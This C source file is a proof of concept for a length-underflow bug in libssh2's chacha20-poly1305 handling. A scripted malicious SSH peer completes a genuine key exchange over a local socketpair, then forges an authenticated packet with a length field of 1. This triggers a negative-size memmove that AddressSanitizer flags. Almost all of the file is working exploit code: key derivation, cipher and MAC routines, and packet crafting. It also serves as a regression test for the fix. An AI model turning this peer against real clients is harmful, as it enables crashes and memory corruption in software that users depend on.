/*
 * Residual PoC: chacha20-poly1305 short-packet length underflow (CWE-191).
 *
 * Drives libssh2's public client API (libssh2_session_handshake followed by
 * libssh2_userauth_list) against a scripted peer over a socketpair. The peer
 * completes a genuine curve25519-sha256 / ssh-ed25519 / chacha20-poly1305@
 * openssh.com key exchange and then sends one authenticated transport packet
 * whose encrypted length field decrypts to 1.
 *
 * crypt_encrypt_chacha20_poly_buffer() then runs
 *     memmove(buf, buf + 4, buf_len - 4)
 * with buf_len == 1, a size_t underflow that AddressSanitizer reports as
 * negative-size-param. The genuine upstream fix rejects such a packet, so it
 * does not fire there; the shipped tree only guards the move with
 * "buf_len - 4 > 0" which is always true for buf_len < 4, so it does fire.
 *
 * No network and no private libssh2 symbols: only documented client entry
 * points are used; the peer is ordinary attacker-controlled bytes.
 */

#include <libssh2.h>

#include <openssl/evp.h>
#include <openssl/sha.h>

#include <pthread.h>
#include <unistd.h>
#include <sys/socket.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

/* ---------------- chacha20 (DJB variant, as used by libssh2) -------------- */

typedef unsigned char u8;
typedef unsigned int u32;

struct chacha_ctx { u32 input[16]; };

#define U32V(v) ((u32)(v) & 0xFFFFFFFFU)
#define ROTL32(v, n)  (U32V((v) << (n)) | ((v) >> (32 - (n))))
#define U8TO32_LITTLE(p) \
    (((u32)((p)[0])) | ((u32)((p)[1]) << 8) | \
     ((u32)((p)[2]) << 16) | ((u32)((p)[3]) << 24))
#define U32TO8_LITTLE(p, v) do { \
    (p)[0] = (u8)(v); (p)[1] = (u8)((v) >> 8); \
    (p)[2] = (u8)((v) >> 16); (p)[3] = (u8)((v) >> 24); } while(0)
#define QUARTERROUND(a, b, c, d) \
    a = U32V(a + b); d = ROTL32(d ^ a, 16); \
    c = U32V(c + d); b = ROTL32(b ^ c, 12); \
    a = U32V(a + b); d = ROTL32(d ^ a, 8);  \
    c = U32V(c + d); b = ROTL32(b ^ c, 7);

static const char sigma[17] = "expand 32-byte k";

static void chacha_keysetup(struct chacha_ctx *x, const u8 *k)
{
    x->input[4] = U8TO32_LITTLE(k + 0);
    x->input[5] = U8TO32_LITTLE(k + 4);
    x->input[6] = U8TO32_LITTLE(k + 8);
    x->input[7] = U8TO32_LITTLE(k + 12);
    k += 16;
    x->input[8] = U8TO32_LITTLE(k + 0);
    x->input[9] = U8TO32_LITTLE(k + 4);
    x->input[10] = U8TO32_LITTLE(k + 8);
    x->input[11] = U8TO32_LITTLE(k + 12);
    x->input[0] = U8TO32_LITTLE(sigma + 0);
    x->input[1] = U8TO32_LITTLE(sigma + 4);
    x->input[2] = U8TO32_LITTLE(sigma + 8);
    x->input[3] = U8TO32_LITTLE(sigma + 12);
}

static void chacha_ivsetup(struct chacha_ctx *x, const u8 *iv,
                           const u8 *counter)
{
    x->input[12] = counter ? U8TO32_LITTLE(counter + 0) : 0;
    x->input[13] = counter ? U8TO32_LITTLE(counter + 4) : 0;
    x->input[14] = U8TO32_LITTLE(iv + 0);
    x->input[15] = U8TO32_LITTLE(iv + 4);
}

static void chacha_encrypt_bytes(struct chacha_ctx *x, const u8 *m, u8 *c,
                                 size_t bytes)
{
    u32 j[16], s[16];
    u8 tmp[64], *ctarget = NULL;
    size_t i;
    memcpy(j, x->input, sizeof(j));
    if(!bytes)
        return;
    for(;;) {
        if(bytes < 64) {
            for(i = 0; i < bytes; ++i) tmp[i] = m[i];
            m = tmp; ctarget = c; c = tmp;
        }
        memcpy(s, j, sizeof(s));
        for(i = 20; i > 0; i -= 2) {
            QUARTERROUND(s[0], s[4], s[8], s[12])
            QUARTERROUND(s[1], s[5], s[9], s[13])
            QUARTERROUND(s[2], s[6], s[10], s[14])
            QUARTERROUND(s[3], s[7], s[11], s[15])
            QUARTERROUND(s[0], s[5], s[10], s[15])
            QUARTERROUND(s[1], s[6], s[11], s[12])
            QUARTERROUND(s[2], s[7], s[8], s[13])
            QUARTERROUND(s[3], s[4], s[9], s[14])
        }
        for(i = 0; i < 16; ++i) s[i] = U32V(s[i] + j[i]);
        for(i = 0; i < 16; ++i)
            s[i] ^= U8TO32_LITTLE(m + 4 * i);
        j[12] = U32V(j[12] + 1);
        if(!j[12]) j[13] = U32V(j[13] + 1);
        for(i = 0; i < 16; ++i)
            U32TO8_LITTLE(c + 4 * i, s[i]);
        if(bytes <= 64) {
            if(bytes < 64)
                for(i = 0; i < bytes; ++i) ctarget[i] = c[i];
            return;
        }
        bytes -= 64; c += 64; m += 64;
    }
}

/* ------------------------------ poly1305 ---------------------------------- */

static void poly1305(u8 tag[16], const u8 *msg, size_t len, const u8 key[32])
{
    EVP_MAC *mac = EVP_MAC_fetch(NULL, "POLY1305", NULL);
    EVP_MAC_CTX *ctx = EVP_MAC_CTX_new(mac);
    size_t outl = 0;
    EVP_MAC_init(ctx, key, 32, NULL);
    EVP_MAC_update(ctx, msg, len);
    EVP_MAC_final(ctx, tag, &outl, 16);
    EVP_MAC_CTX_free(ctx);
    EVP_MAC_free(mac);
}

/* ------------------------------- helpers --------------------------------- */

static void die(const char *m) { fprintf(stderr, "poc: %s\n", m); exit(2); }

static void w32(u8 *p, uint32_t v)
{
    p[0] = (u8)(v >> 24); p[1] = (u8)(v >> 16);
    p[2] = (u8)(v >> 8);  p[3] = (u8)v;
}

static void write_all(int fd, const void *buf, size_t len)
{
    const u8 *p = buf;
    while(len) {
        ssize_t n = write(fd, p, len);
        if(n <= 0) die("write");
        p += n; len -= (size_t)n;
    }
}

static void read_all(int fd, void *buf, size_t len)
{
    u8 *p = buf;
    while(len) {
        ssize_t n = read(fd, p, len);
        if(n <= 0) die("read");
        p += n; len -= (size_t)n;
    }
}

/* growable byte buffer */
struct buf { u8 *d; size_t len, cap; };
static void bput(struct buf *b, const void *p, size_t n)
{
    if(b->len + n > b->cap) {
        b->cap = (b->len + n) * 2 + 64;
        b->d = realloc(b->d, b->cap);
        if(!b->d) die("oom");
    }
    memcpy(b->d + b->len, p, n);
    b->len += n;
}
static void bput_str(struct buf *b, const void *p, size_t n)
{
    u8 l[4]; w32(l, (uint32_t)n);
    bput(b, l, 4);
    bput(b, p, n);
}
static void bput_cstr(struct buf *b, const char *s)
{
    bput_str(b, s, strlen(s));
}
static void bput_byte(struct buf *b, u8 v) { bput(b, &v, 1); }

/* send an unencrypted SSH binary packet carrying 'payload' */
static void send_pkt(int fd, const u8 *payload, size_t plen)
{
    size_t need = 5 + plen;            /* 4 len + 1 padlen + payload */
    size_t pad = 8 - (need % 8);
    if(pad < 4) pad += 8;
    size_t pkt_len = 1 + plen + pad;   /* padlen + payload + padding */
    u8 hdr[5];
    u8 padding[64];
    w32(hdr, (uint32_t)pkt_len);
    hdr[4] = (u8)pad;
    memset(padding, 0, sizeof(padding));
    write_all(fd, hdr, 5);
    write_all(fd, payload, plen);
    write_all(fd, padding, pad);
}

/* read an unencrypted SSH binary packet; return payload (malloc'd) */
static u8 *recv_pkt(int fd, size_t *plen)
{
    u8 lb[5];
    read_all(fd, lb, 4);
    uint32_t pkt_len = ((uint32_t)lb[0] << 24) | ((uint32_t)lb[1] << 16) |
                       ((uint32_t)lb[2] << 8) | lb[3];
    if(pkt_len < 1 || pkt_len > 100000) die("bad pkt_len");
    u8 *body = malloc(pkt_len);
    if(!body) die("oom");
    read_all(fd, body, pkt_len);
    u8 pad = body[0];
    if((size_t)pad + 1 > pkt_len) die("bad pad");
    *plen = pkt_len - 1 - pad;
    memmove(body, body + 1, *plen);
    return body;
}

/* ---------------------------- OpenSSL glue ------------------------------- */

static EVP_PKEY *gen(const char *type)
{
    EVP_PKEY *k = EVP_PKEY_Q_keygen(NULL, NULL, type);
    if(!k) die("keygen");
    return k;
}
static void raw_pub(EVP_PKEY *k, u8 out[32])
{
    size_t l = 32;
    if(!EVP_PKEY_get_raw_public_key(k, out, &l) || l != 32) die("raw_pub");
}

/* append K as an SSH mpint to buffer b */
static void bput_mpint(struct buf *b, const u8 *v, size_t n)
{
    size_t i = 0;
    while(i < n && v[i] == 0) i++;
    size_t rem = n - i;
    if(rem == 0) { u8 z[4] = {0,0,0,0}; bput(b, z, 4); return; }
    int need0 = (v[i] & 0x80) ? 1 : 0;
    u8 l[4]; w32(l, (uint32_t)(rem + need0));
    bput(b, l, 4);
    if(need0) { u8 z = 0; bput(b, &z, 1); }
    bput(b, v + i, rem);
}

/* --------------------------- server (peer) ------------------------------- */

static const char SERVER_BANNER[] = "SSH-2.0-malpeer";

struct srv { int fd; };

static void build_kexinit(struct buf *b)
{
    u8 cookie[16];
    memset(cookie, 0x41, sizeof(cookie));
    bput_byte(b, 20);                 /* SSH_MSG_KEXINIT */
    bput(b, cookie, 16);
    bput_cstr(b, "curve25519-sha256");
    bput_cstr(b, "ssh-ed25519");
    bput_cstr(b, "chacha20-poly1305@openssh.com");
    bput_cstr(b, "chacha20-poly1305@openssh.com");
    bput_cstr(b, "hmac-sha2-256");
    bput_cstr(b, "hmac-sha2-256");
    bput_cstr(b, "none");
    bput_cstr(b, "none");
    bput_cstr(b, "");
    bput_cstr(b, "");
    bput_byte(b, 0);                  /* first_kex_packet_follows */
    { u8 z[4] = {0,0,0,0}; bput(b, z, 4); }  /* reserved */
}

/* derive one SSH key stream of 'outlen' bytes with the given letter */
static void derive_key(const struct buf *mpk, const u8 H[32],
                       char letter, u8 *out, size_t outlen)
{
    u8 block[32];
    size_t have = 0;
    /* K1 = SHA256(mpint_K || H || letter || session_id(=H)) */
    {
        SHA256_CTX c; SHA256_Init(&c);
        SHA256_Update(&c, mpk->d, mpk->len);
        SHA256_Update(&c, H, 32);
        SHA256_Update(&c, &letter, 1);
        SHA256_Update(&c, H, 32);
        SHA256_Final(block, &c);
    }
    size_t n = outlen < 32 ? outlen : 32;
    memcpy(out, block, n); have = 32;
    while(have < outlen) {
        /* Kn = SHA256(mpint_K || H || all-previous) */
        SHA256_CTX c; SHA256_Init(&c);
        SHA256_Update(&c, mpk->d, mpk->len);
        SHA256_Update(&c, H, 32);
        SHA256_Update(&c, out, have);
        SHA256_Final(block, &c);
        size_t take = (outlen - have) < 32 ? (outlen - have) : 32;
        memcpy(out + have, block, take);
        have += 32;
    }
}

static void *server_main(void *arg)
{
    struct srv *s = arg;
    int fd = s->fd;

    /* 1. banners */
    char banner[64];
    snprintf(banner, sizeof(banner), "%s\r\n", SERVER_BANNER);
    write_all(fd, banner, strlen(banner));

    char vc[256]; size_t vci = 0;
    for(;;) {
        char ch; read_all(fd, &ch, 1);
        if(ch == '\n') break;
        if(ch == '\r') continue;
        if(vci < sizeof(vc) - 1) vc[vci++] = ch;
    }
    vc[vci] = 0;                       /* V_C without CRLF */

    /* 2. our KEXINIT (payload == I_S) */
    struct buf is = {0}; build_kexinit(&is);
    send_pkt(fd, is.d, is.len);

    /* 3. client KEXINIT (payload == I_C) */
    size_t iclen; u8 *ic = recv_pkt(fd, &iclen);
    if(iclen < 1 || ic[0] != 20) die("expected client KEXINIT");

    /* 4. client KEX_ECDH_INIT -> Q_C */
    size_t einlen; u8 *ein = recv_pkt(fd, &einlen);
    if(einlen < 5 || ein[0] != 30) die("expected KEX_ECDH_INIT");
    uint32_t qclen = ((uint32_t)ein[1] << 24) | ((uint32_t)ein[2] << 16) |
                     ((uint32_t)ein[3] << 8) | ein[4];
    if(qclen != 32 || einlen < 5 + 32) die("bad Q_C");
    u8 Qc[32]; memcpy(Qc, ein + 5, 32);

    /* 5. server ephemeral X25519 and host ed25519 keys */
    EVP_PKEY *eph = gen("X25519");
    EVP_PKEY *host = gen("ED25519");
    u8 Qs[32]; raw_pub(eph, Qs);
    u8 hostpub[32]; raw_pub(host, hostpub);

    /* shared secret K */
    EVP_PKEY *cpub = EVP_PKEY_new_raw_public_key(EVP_PKEY_X25519, NULL, Qc, 32);
    if(!cpub) die("cpub");
    EVP_PKEY_CTX *dc = EVP_PKEY_CTX_new(eph, NULL);
    if(!dc || EVP_PKEY_derive_init(dc) <= 0 ||
       EVP_PKEY_derive_set_peer(dc, cpub) <= 0) die("derive init");
    u8 Kraw[32]; size_t klen = 32;
    if(EVP_PKEY_derive(dc, Kraw, &klen) <= 0 || klen != 32) die("derive");

    /* host key blob K_S = string("ssh-ed25519") string(pub) */
    struct buf ks = {0};
    bput_cstr(&ks, "ssh-ed25519");
    bput_str(&ks, hostpub, 32);

    /* mpint(K) reused for H and key derivation */
    struct buf mpk = {0};
    bput_mpint(&mpk, Kraw, 32);

    /* 6. exchange hash H */
    u8 H[32];
    {
        struct buf hb = {0};
        bput_str(&hb, vc, strlen(vc));            /* V_C */
        bput_cstr(&hb, SERVER_BANNER);            /* V_S */
        bput_str(&hb, ic, iclen);                 /* I_C */
        bput_str(&hb, is.d, is.len);              /* I_S */
        bput_str(&hb, ks.d, ks.len);              /* K_S */
        bput_str(&hb, Qc, 32);                    /* Q_C */
        bput_str(&hb, Qs, 32);                    /* Q_S */
        bput(&hb, mpk.d, mpk.len);                /* mpint K */
        SHA256((unsigned char *)hb.d, hb.len, H);
        free(hb.d);
    }

    /* 7. sign H with host key */
    u8 sig[64]; size_t siglen = sizeof(sig);
    {
        EVP_MD_CTX *mc = EVP_MD_CTX_new();
        if(EVP_DigestSignInit(mc, NULL, NULL, NULL, host) <= 0 ||
           EVP_DigestSign(mc, sig, &siglen, H, 32) <= 0 || siglen != 64)
            die("sign");
        EVP_MD_CTX_free(mc);
    }
    struct buf sigblob = {0};
    bput_cstr(&sigblob, "ssh-ed25519");
    bput_str(&sigblob, sig, 64);

    /* 8. KEX_ECDH_REPLY */
    struct buf rep = {0};
    bput_byte(&rep, 31);
    bput_str(&rep, ks.d, ks.len);
    bput_str(&rep, Qs, 32);
    bput_str(&rep, sigblob.d, sigblob.len);
    send_pkt(fd, rep.d, rep.len);

    /* 9. NEWKEYS */
    { u8 nk = 21; send_pkt(fd, &nk, 1); }

    /* 10. read until client NEWKEYS */
    for(;;) {
        size_t l; u8 *p = recv_pkt(fd, &l);
        int done = (l >= 1 && p[0] == 21);
        free(p);
        if(done) break;
    }

    /* 11. server->client encryption key (letter 'D', 64 bytes) */
    u8 key[64];
    derive_key(&mpk, H, 'D', key, 64);
    const u8 *mainkey = key;        /* payload key   */
    const u8 *hdrkey  = key + 32;   /* length key    */

    /* 12. craft an authenticated packet with length field == 1 (seqno 3) */
    uint64_t seqno = 3;
    u8 seqbuf[8];
    for(int i = 0; i < 8; i++)
        seqbuf[i] = (u8)(seqno >> (56 - 8 * i));

    /* poly1305 key = chacha20(mainkey, nonce=seqbuf, ctr=0)[0..32] */
    u8 polykey[32]; memset(polykey, 0, 32);
    {
        struct chacha_ctx c; chacha_keysetup(&c, mainkey);
        chacha_ivsetup(&c, seqbuf, NULL);
        chacha_encrypt_bytes(&c, polykey, polykey, 32);
    }

    /* encrypted length field = chacha20(hdrkey, ctr=0)[0..4] XOR be32(1) */
    u8 pkt[4 + 1 + 16];
    u8 lenpt[4]; w32(lenpt, 1);
    {
        struct chacha_ctx c; chacha_keysetup(&c, hdrkey);
        chacha_ivsetup(&c, seqbuf, NULL);
        chacha_encrypt_bytes(&c, lenpt, pkt, 4);
    }

    /* encrypted 1-byte payload = chacha20(mainkey, ctr=1)[0] XOR 0 */
    {
        u8 one[8] = {1,0,0,0,0,0,0,0};
        u8 zero = 0;
        struct chacha_ctx c; chacha_keysetup(&c, mainkey);
        chacha_ivsetup(&c, seqbuf, one);
        chacha_encrypt_bytes(&c, &zero, pkt + 4, 1);
    }

    /* poly1305 tag over the 5 AAD+ciphertext bytes */
    poly1305(pkt + 5, pkt, 5, polykey);

    write_all(fd, pkt, sizeof(pkt));

    /* keep the connection open so the client can read the packet */
    for(;;) { char tmp[64]; if(read(fd, tmp, sizeof(tmp)) <= 0) break; }
    return NULL;
}

/* ------------------------------- client ---------------------------------- */

int main(void)
{
    int sv[2];
    if(socketpair(AF_UNIX, SOCK_STREAM, 0, sv) != 0) die("socketpair");

    if(libssh2_init(0) != 0) die("libssh2_init");

    struct srv s = { sv[1] };
    pthread_t th;
    if(pthread_create(&th, NULL, server_main, &s) != 0) die("pthread");

    LIBSSH2_SESSION *session = libssh2_session_init();
    if(!session) die("session_init");
    libssh2_session_set_blocking(session, 1);

    int rc = libssh2_session_handshake(session, sv[0]);
    if(rc) {
        /* The crafted short packet was rejected before the vulnerable
           memmove: this is the secure outcome (fixed tree). */
        fprintf(stderr, "poc: short packet rejected rc=%d (no crash)\n", rc);
        fflush(stderr);
        _exit(0);
    }

    /* If the handshake read did not already abort, drive one more transport
       read; either way reaching here means no memory-safety fault fired. */
    const char *user = "user";
    char *list = libssh2_userauth_list(session, user,
                                       (unsigned int)strlen(user));
    fprintf(stderr, "poc: userauth_list returned %p (no crash)\n",
            (void *)list);
    fflush(stderr);
    _exit(0);
}
